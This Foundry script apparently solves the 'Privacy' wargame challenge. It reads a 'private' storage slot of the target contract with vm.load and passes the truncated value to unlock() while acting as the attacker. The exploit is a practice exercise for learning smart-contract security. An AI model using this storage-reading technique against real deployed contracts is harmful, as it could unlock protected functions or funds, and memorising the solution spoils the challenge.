// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/Privacy/Privacy.sol";

contract PrivacyScript is Script {

    address internal attacker;
    address internal deployer;
    Privacy target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = Privacy(0x0000000000000000000000000000000000000000); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            bytes32[3] memory _data;
            _data[0] = bytes32("0xasdasdsadasd");
            _data[1] = bytes32("0xasdasdsadasd");
            _data[2] = bytes32("0xasdasdsadasd");
            target = new Privacy(_data);
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console2.log("[Info]");
        console2.log("attacker : %s", attacker);

        console2.log("[Exploit]");
        bytes32 data = vm.load(address(target), bytes32(uint256(5)));
        console2.logBytes32(data);
        vm.broadcast(attacker);
        target.unlock(bytes16(data));
        console2.log("locked : %s", target.locked());
    }
}